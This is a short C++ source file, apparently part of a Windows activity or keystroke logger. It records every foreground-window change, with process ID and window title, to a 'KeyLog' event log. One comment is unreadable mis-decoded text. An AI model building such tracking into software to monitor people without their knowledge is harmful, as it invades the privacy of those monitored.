#include "WindowManager.h"
#include "LogManager.h"
#include "Tools.h"


void WindowManager::Start()
{
}

void WindowManager::OnDestroy()
{

}
void WindowManager::Update()
{
	//��⵱ǰ�����
	HWND hWindow = GetForegroundWindow();
	if (hWindow != NULL)
	{
		DWORD ldwProID;
		GetWindowThreadProcessId(hWindow, &ldwProID);
		wstring wTitle = Tools::GetWindowTitle(hWindow);
		if (ldwProID != mLastPid || wTitle!=mLastTitle)
		{
			mLastPid = ldwProID;
			mLastTitle = wTitle;
			KeyLog::LogEvent(EVENT_TYPE::EVENT_WINDOW_CHANGE, "pid:" + to_string(ldwProID)
				+ "	title:"+ Tools::wstring2string(wTitle));
		}
	}
}
void WindowManager::HandleMsg(const MSG& rMsg)
{

}
